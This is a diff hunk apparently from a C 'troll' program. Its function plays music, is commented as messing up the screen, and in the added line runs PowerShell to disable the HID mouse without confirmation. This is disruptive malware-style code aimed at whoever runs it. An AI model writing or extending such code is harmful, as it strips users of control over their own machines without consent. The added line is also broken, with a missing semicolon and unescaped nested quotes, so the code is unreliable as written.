@@ -170,6 +170,7 @@ void trollies(void *arg)
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
 
     //Disable mouse
+    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName "HID-compliant mouse").InstanceId -Confirm:$false\"")
 
     //Messes up computer screen
 
